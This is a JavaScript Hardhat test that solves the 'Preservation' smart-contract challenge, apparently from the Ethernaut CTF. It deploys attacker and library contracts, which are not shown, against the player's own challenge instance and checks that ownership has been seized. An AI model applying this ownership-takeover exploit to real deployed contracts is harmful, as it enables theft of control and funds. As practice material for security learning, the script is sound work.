const { assert } = require("chai")
const { ethers, waffle } = require("hardhat")
require("dotenv").config()

const provider = waffle.provider
let player, challenge, challengeAddress, tx, attacker, devilLib

beforeEach(async () => {
    accounts = await ethers.getSigners()
    player = accounts[0]

    challengeAddress = process.env.CHALLENGEADDRESS16 //address of my instance contract
    const challengeFactory = await ethers.getContractFactory(`Preservation`)
    challenge = await challengeFactory.attach(challengeAddress)

    const devilLibFactory = await ethers.getContractFactory(`PreservationAttackerLibrary`)
    devilLib = await devilLibFactory.deploy()

    const attackerFactory = await ethers.getContractFactory(`PreservationAttacker`)
    attacker = await attackerFactory.deploy(challengeAddress, devilLib.address)
})

it("Solves the challenge 'Preservation'", async () => {
    
    tx = await attacker.attack()
    await tx.wait(1)

    let owner = await challenge.owner()
    assert(owner == player.address, "You are not the owner!")
})
